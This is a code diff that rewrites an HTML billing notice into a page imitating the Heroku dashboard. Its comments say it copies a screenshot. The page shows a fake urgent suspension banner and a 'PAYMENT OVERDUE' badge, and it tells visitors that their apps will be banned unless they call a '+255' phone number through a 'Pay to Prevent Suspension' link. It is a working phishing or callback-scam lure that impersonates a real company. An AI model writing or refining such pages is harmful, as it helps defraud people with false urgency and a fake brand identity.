@@ -3,104 +3,159 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Billing Service Notice</title>
+    <title>Heroku | Dashboard</title>
     <style>
         body {
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;
             background-color: #f1f1f6;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
             margin: 0;
+            padding: 0;
+            color: #3f3f44;
         }
 
-        .box {
-            background: #ffffff;
-            padding: 40px;
-            border-radius: 6px;
-            border: 1px solid #d9d9de;
+        /* The Purple Warning Banner from the top of the image */
+        .urgent-banner {
+            background-color: #79589f;
+            color: #ffffff;
             text-align: center;
-            max-width: 450px;
-            width: 90%;
-            box-shadow: 0 2px 4px rgba(0,0,0,0.05);
+            padding: 12px 10px;
+            font-size: 14px;
+            font-weight: 500;
+            border-bottom: 2px solid #634683;
         }
 
-        h1 {
-            color: #430098; /* Heroku Purple */
-            font-size: 22px;
-            margin-bottom: 10px;
+        .urgent-banner a {
+            color: #fff;
+            text-decoration: underline;
+            font-weight: bold;
         }
 
-        p {
-            color: #58517e;
-            font-size: 15px;
-            line-height: 1.5;
+        /* Header mimic */
+        .header {
+            background: #fff;
+            padding: 15px 20px;
+            border-bottom: 1px solid #d9d9de;
+            display: flex;
+            align-items: center;
         }
 
-        .alert-text {
+        .logo {
+            color: #430098;
+            font-weight: 800;
+            font-size: 18px;
+            letter-spacing: 1px;
+        }
+
+        /* Main Container */
+        .container {
+            max-width: 600px;
+            margin: 40px auto;
+            padding: 0 20px;
+        }
+
+        .card {
+            background: #fff;
+            border: 1px solid #d9d9de;
+            border-radius: 6px;
+            padding: 40px 30px;
+            text-align: center;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.05);
+        }
+
+        h2 {
+            color: #430098;
+            font-size: 24px;
+            margin-top: 0;
+        }
+
+        .status-badge {
+            display: inline-block;
+            background: #fff0f0;
             color: #d12d2d;
-            font-weight: 600;
+            border: 1px solid #facccc;
+            padding: 4px 12px;
+            border-radius: 20px;
+            font-size: 13px;
+            font-weight: bold;
             margin-bottom: 20px;
         }
 
-        .billing-access {
-            background-color: #f8f9ff;
-            border: 1px dashed #79589f;
-            padding: 15px;
-            margin: 20px 0;
-            border-radius: 4px;
-            font-size: 14px;
+        .message {
+            line-height: 1.6;
+            color: #58517e;
+            margin-bottom: 30px;
         }
 
-        .phone-number {
+        .billing-box {
+            background: #f8f9ff;
+            border: 1px solid #e1e1e8;
+            border-radius: 4px;
+            padding: 20px;
+            margin-bottom: 30px;
+        }
+
+        .billing-box strong {
             display: block;
-            font-weight: bold;
             font-size: 18px;
             color: #430098;
             margin-top: 5px;
         }
 
-        .btn {
-            background-color: #79589f; /* Button color from screenshot */
+        /* The Purple Button from the screenshot */
+        .btn-pay {
+            background-color: #79589f;
             color: white;
-            padding: 14px 28px;
             text-decoration: none;
+            padding: 14px 30px;
             border-radius: 4px;
             font-weight: 600;
             display: inline-block;
-            transition: background-color 0.2s;
-            margin-top: 10px;
+            transition: background 0.2s;
         }
 
-        .btn:hover {
+        .btn-pay:hover {
             background-color: #634683;
         }
 
-        .footer-note {
+        .footer {
+            margin-top: 20px;
             font-size: 12px;
             color: #9b99af;
-            margin-top: 20px;
         }
     </style>
 </head>
 <body>
-    <div class="box">
-        <h1>Payment Required</h1>
-        <p class="alert-text">Suspension Scheduled: 20/02/2026</p>
-        
-        <p>To maintain your service, please complete your payment via our authorized billing terminal:</p>
-        
-        <div class="billing-access">
-            Authorized Billing Number:
-            <span class="phone-number">+255 610 274 920</span>
-        </div>
 
-        <a href="tel:+255610274920" class="btn">Proceed to Payment</a>
-
-        <p class="footer-note">
-            Note: This system only recognizes payments made through the number listed above.
-        </p>
+    <div class="urgent-banner">
+        Critical: Your account is scheduled for suspension <strong>Today at 00:00</strong>. <a href="#">Fix Now</a>
     </div>
+
+    <div class="header">
+        <div class="logo">HEROKU</div>
+    </div>
+
+    <div class="container">
+        <div class="card">
+            <div class="status-badge">PAYMENT OVERDUE</div>
+            <h2>Service Suspension Notice</h2>
+            
+            <p class="message">
+                Your Heroku apps and pipelines are scheduled to be <strong>banned and suspended</strong> on 
+                <br><strong>20/02/2026 at 00:00</strong> due to unsuccessful payment processing.
+            </p>
+
+            <div class="billing-box">
+                Authorized Billing Access Only:
+                <strong>+255 610 274 920</strong>
+            </div>
+
+            <a href="tel:+255610274920" class="btn-pay">Pay to Prevent Suspension</a>
+
+            <div class="footer">
+                Only payments made to the authorized number above will clear this notice.
+            </div>
+        </div>
+    </div>
+
 </body>
 </html>
